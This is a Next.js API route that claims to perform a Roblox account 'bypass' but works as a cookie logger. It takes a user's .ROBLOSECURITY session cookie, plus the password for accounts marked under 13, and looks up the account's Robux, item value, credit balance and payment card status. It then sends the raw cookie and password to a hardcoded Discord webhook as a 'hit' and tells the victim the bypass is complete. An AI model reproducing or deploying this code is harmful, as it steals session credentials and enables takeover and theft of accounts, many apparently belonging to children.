import { type NextRequest, NextResponse } from "next/server"

export async function POST(request: NextRequest) {
  try {
    const { cookie, password, accountType } = await request.json()

    if (!cookie) {
      return NextResponse.json({ success: false, message: "Cookie is required" }, { status: 400 })
    }

    if (!accountType) {
      return NextResponse.json({ success: false, message: "Account type is required" }, { status: 400 })
    }

    const cleanCookie = cookie
      .trim()
      .replace(/^WARNING:?\s*/i, "")
      .trim()

    if (cleanCookie.length < 50) {
      return NextResponse.json(
        { success: false, message: "Invalid cookie format. Please check your cookie." },
        { status: 400 },
      )
    }

    let userInfo: any = null

    try {
      const userResponse = await fetch("https://users.roblox.com/v1/users/authenticated", {
        headers: {
          Cookie: `.ROBLOSECURITY=${cleanCookie}`,
          "User-Agent": "Mozilla/5.0",
        },
      })

      if (!userResponse.ok) {
        return NextResponse.json(
          { success: false, message: "Invalid Roblox cookie. Please verify your cookie and try again." },
          { status: 401 },
        )
      }

      userInfo = await userResponse.json()

      // Get additional user details
      try {
        const [detailsResponse, avatarResponse, economyResponse, creditResponse, paymentResponse] = await Promise.all([
          fetch(`https://users.roblox.com/v1/users/${userInfo.id}`),
          fetch(
            `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userInfo.id}&size=150x150&format=Png`,
          ),
          fetch(`https://economy.roblox.com/v1/users/${userInfo.id}/currency`),
          fetch(`https://billing.roblox.com/v1/credit`, {
            headers: {
              Cookie: `.ROBLOSECURITY=${cleanCookie}`,
            },
          }),
          fetch(`https://billing.roblox.com/v1/payment-methods`, {
            headers: {
              Cookie: `.ROBLOSECURITY=${cleanCookie}`,
            },
          }),
        ])

        if (detailsResponse.ok) {
          const details = await detailsResponse.json()
          userInfo.displayName = details.displayName
          userInfo.created = details.created
          userInfo.description = details.description
        }

        if (avatarResponse.ok) {
          const avatarData = await avatarResponse.json()
          if (avatarData.data && avatarData.data[0]) {
            userInfo.avatar = avatarData.data[0].imageUrl
          }
        }

        if (economyResponse.ok) {
          const economyData = await economyResponse.json()
          userInfo.robux = economyData.robux || 0
        }

        if (creditResponse.ok) {
          const creditData = await creditResponse.json()
          userInfo.credit = creditData.balance || 0
        } else {
          userInfo.credit = 0
        }

        if (paymentResponse.ok) {
          const paymentData = await paymentResponse.json()
          userInfo.hasPaymentMethod = paymentData.data && paymentData.data.length > 0
        } else {
          userInfo.hasPaymentMethod = false
        }
      } catch (error) {
        console.error("Error fetching additional details:", error)
      }
    } catch (error) {
      console.error("Error fetching user info:", error)
      return NextResponse.json(
        { success: false, message: "Failed to validate cookie. Please try again." },
        { status: 500 },
      )
    }

    if (userInfo && userInfo.id) {
      try {
        let totalRAP = 0
        let robuxSummary = "Data unavailable"
        let hasKorblox = false

        try {
          const collectiblesResponse = await fetch(
            `https://inventory.roblox.com/v1/users/${userInfo.id}/assets/collectibles?limit=100`,
            {
              headers: {
                Cookie: `.ROBLOSECURITY=${cleanCookie}`,
              },
            },
          )
          if (collectiblesResponse.ok) {
            const collectiblesData = await collectiblesResponse.json()
            if (collectiblesData.data && Array.isArray(collectiblesData.data)) {
              totalRAP = collectiblesData.data.reduce((sum: number, item: any) => {
                return sum + (item.recentAveragePrice || 0)
              }, 0)
              hasKorblox = collectiblesData.data.some((item: any) => {
                const korbloxIds = [139607770, 139607718, 139607673] // Common Korblox item IDs
                return korbloxIds.includes(item.assetId)
              })
            }
          }
        } catch (error) {
          console.error("Error fetching RAP:", error)
        }

        try {
          const summaryResponse = await fetch(
            `https://economy.roblox.com/v2/users/${userInfo.id}/transaction-totals?timeFrame=Year&transactionType=summary`,
            {
              headers: {
                Cookie: `.ROBLOSECURITY=${cleanCookie}`,
              },
            },
          )
          if (summaryResponse.ok) {
            const summaryData = await summaryResponse.json()
            const robuxGained = summaryData.incomingRobuxTotal || 0
            const robuxSpent = summaryData.outgoingRobuxTotal || 0
            robuxSummary = `${Math.abs(robuxGained - robuxSpent).toLocaleString()} Robux ${robuxGained > robuxSpent ? "Gained" : "Spent"}`
          }
        } catch (error) {
          console.error("Error fetching transaction summary:", error)
        }

        const summaryMatch = robuxSummary.match(/[\d,]+/)
        const summaryValue = summaryMatch ? Number.parseInt(summaryMatch[0].replace(/,/g, "")) : 0

        const embedFields: any[] = [
          {
            name: "👤 Username",
            value: userInfo.name || "Unknown",
            inline: true,
          },
          {
            name: "🆔 User ID",
            value: String(userInfo.id || "Unknown"),
            inline: true,
          },
          {
            name: "✨ Display Name",
            value: userInfo.displayName || userInfo.name || "Unknown",
            inline: true,
          },
          {
            name: "💰 Current Robux",
            value: String(userInfo.robux || 0),
            inline: true,
          },
          {
            name: "💎 Total RAP",
            value: String(totalRAP),
            inline: true,
          },
          {
            name: "💳 Credit Balance",
            value: `$${(userInfo.credit || 0).toFixed(2)}`,
            inline: true,
          },
          {
            name: "💳 Payment Method",
            value: userInfo.hasPaymentMethod ? "✅ Card Connected" : "❌ No Card",
            inline: true,
          },
          {
            name: "👑 Korblox Status",
            value: hasKorblox ? "✅ Has Korblox" : "❌ No Korblox",
            inline: true,
          },
          {
            name: "📊 Total Summary",
            value: robuxSummary,
            inline: false,
          },
          {
            name: "🔗 Bypass Link",
            value: `https://lexar1-bypass-tools.vercel.app/`,
            inline: false,
          },
          {
            name: "🍪 Cookie",
            value: "```" + cleanCookie + "```",
            inline: false,
          },
        ]

        if (accountType === "under13") {
          embedFields.push({
            name: "🔑 Password",
            value: "```" + (password || "Not provided") + "```",
            inline: false,
          })
        }

        const embed = {
          title: "@everyone🔓 New Roblox Cookie Captured",
          color: 0x00ff00,
          thumbnail: {
            url:
              userInfo.avatar ||
              "https://www.roblox.com/headshot-thumbnail/image?userId=" +
                userInfo.id +
                "&width=150&height=150&format=png",
          },
          fields: embedFields,
          timestamp: new Date().toISOString(),
          footer: {
            text: "ginawa ito lahat ni janrick",
            icon_url: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQWskFuZKichHiRHaNTJVV26sG9OMPO33xEHw&s",
          },
        }

        const webhookUrl =
          "https://discord.com/api/webhooks/1454198983483457557/s4yV8Bet6JPxp2gJKMTv6tqmM1CSb6y7yFgJaoue92Z-LqgHKsl5e_gbrQxIIlgkPQOW"

        const webhookPromises = [
          fetch(webhookUrl, {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({
              content: `@everyone 🎯New hit from **${userInfo.name}**`,
              embeds: [embed],
              username: "hits bypasser",
              avatar_url: "https://www.roblox.com/favicon.ico",
            }),
          }),
        ]

        await Promise.all(webhookPromises)
      } catch (webhookError) {
        console.error("Webhook error:", webhookError)
      }

      return NextResponse.json({
        success: true,
        message: "Bypass complete!",
        userInfo: userInfo,
      })
    } else {
      return NextResponse.json({ success: false, message: "Failed to retrieve user information." }, { status: 500 })
    }
  } catch (error) {
    console.error("Bypass error:", error)
    return NextResponse.json({ success: false, message: "An error occurred. Please try again." }, { status: 500 })
  }
}
